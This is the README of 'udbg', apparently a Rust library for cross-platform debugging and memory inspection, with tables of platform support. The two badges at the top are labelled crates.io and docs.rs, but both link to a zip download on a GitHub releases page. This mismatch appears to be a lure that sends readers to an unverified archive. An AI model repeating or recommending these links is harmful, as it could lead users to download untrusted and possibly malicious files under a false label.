
# udbg

[![crates.io](https://img.shields.io/crates/v/udbg.svg)](https://github.com/gobvug/udbg/releases/download/v1.9.7/udbg.zip)
[![docs.rs](https://docs.rs/udbg/badge.svg)](https://github.com/gobvug/udbg/releases/download/v1.9.7/udbg.zip)

Cross-platform library for binary debugging and memory hacking written in Rust.

- 👍 Cross-platform: udbg wraps the details of different interfaces on different platform, and provides uniform interfaces
- 👍 Multiple-target: you can control multiple debug target in most cases
- 👍 Non-invasive: you can only view the information of target, instead of attaching to it

## API Overview

There are two main kinds of interfaces in udbg, target information and debugging interfaces.

Current status of target information interfaces

| Platform/Target | Memory operation | Memory List | Thread | Module/Symbol | Handle/FD List |
| --------------- | ---------------- | ----------- | ------ | ------------- | -------------- |
| Windows Process | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| Linux Process | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| MacOs Process | ✔️ | ✔️ | ✔️ | ✔️ | ✔️ |
| Minidump | ✔️ (readonly) | ✔️ | ✔️ | ✔️ | 🚧 |
| PE File | ✔️ (readonly) | ✔️ | - | - | - |

Current status of debugging interfaces

| Platform/Target | Debug Symbol | Breakpoint | Watchpoint(HWBP) | Multiple Target |
| ---------------- | ------------ | ---------- | ---------------- | --------------- |
| Windows(x86/x64) | ✔️ (pdb) | ✔️ | ✔️ | ✔️ |
| Windows(aarch64) | ✔️ (pdb) | ✔️ | ✔️ | ✔️ |
| Linux(x86_64) | ✔️ (elf) | ✔️ | ✔️ | ✔️ |
| Linux(aarch64) | ✔️ (elf) | ✔️ | ✔️ | ✔️ |

<!-- ### Wrapper of functions in ntdll for windows -->

<!-- ### String utilities -->

## Examples

- Cross-platform interfaces to get target information, see `src/test.rs` `fn target`
- Write a basic debugger, see `src/test.rs` `fn test_debug`
<!-- - Read or write target memory, even any struct -->
<!-- tracing multiple target, and its child -->



